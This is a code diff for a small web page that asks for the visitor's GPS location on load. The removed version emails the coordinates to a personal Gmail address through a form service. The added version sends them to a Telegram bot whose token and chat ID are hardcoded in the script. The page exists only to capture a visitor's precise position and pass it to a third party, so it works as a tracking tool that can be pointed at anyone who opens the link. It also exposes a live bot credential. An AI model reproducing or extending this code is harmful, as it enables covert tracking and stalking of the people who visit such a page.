@@ -1,52 +1,40 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Send Location</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body { font-family: sans-serif; text-align: center; padding: 2rem; }
-    #status { margin-top: 1rem; font-size: 1.1rem; color: #333; }
-  </style>
-</head>
-<body>
-  <h2>Sending Your Location...</h2>
-  <p id="status">Please allow GPS access when prompted.</p>
+<script>
+  const status = document.getElementById('status');
+  const botToken = "8124009104:AAFuO-IJRweLKAjiRaZYIWgMep6XTEQYTWg";
+  const chatId = "8002479084";
 
-  <form action="https://formsubmit.co/ekydlr@gmail.com" method="POST" id="locationForm">
-    <input type="hidden" name="location" id="coords">
-    <input type="hidden" name="_subject" value="New Location Submitted">
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_template" value="table">
-  </form>
+  function submitLocation(lat, lon) {
+    const message = `Location: ${lat}, ${lon}`;
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    
+    fetch(url)
+      .then(response => {
+        if (response.ok) {
+          status.textContent = "Location sent successfully.";
+        } else {
+          status.textContent = "Failed to send location.";
+        }
+      })
+      .catch(() => {
+        status.textContent = "Network error while sending location.";
+      });
+  }
 
-  <script>
-    const form = document.getElementById('locationForm');
-    const coords = document.getElementById('coords');
-    const status = document.getElementById('status');
+  function showError(error) {
+    let msg = "Unable to get location.";
+    if (error.code === 1) msg = "Permission denied.";
+    else if (error.code === 2) msg = "Location unavailable.";
+    else if (error.code === 3) msg = "Location request timed out.";
+    status.textContent = msg;
+  }
 
-    function submitLocation(lat, lon) {
-      coords.value = lat + ", " + lon;
-      status.textContent = "Location found. Submitting...";
-      form.submit();
-    }
-
-    function showError(error) {
-      let msg = "Unable to get location.";
-      if (error.code === 1) msg = "Permission denied.";
-      else if (error.code === 2) msg = "Location unavailable.";
-      else if (error.code === 3) msg = "Location request timed out.";
-      status.textContent = msg;
-    }
-
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        position => submitLocation(position.coords.latitude, position.coords.longitude),
-        showError,
-        { enableHighAccuracy: true, timeout: 10000 }
-      );
-    } else {
-      status.textContent = "Geolocation is not supported by this browser.";
-    }
-  </script>
-</body>
-</html>
+  if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(
+      pos => submitLocation(pos.coords.latitude, pos.coords.longitude),
+      showError,
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+  } else {
+    status.textContent = "Geolocation not supported.";
+  }
+</script>
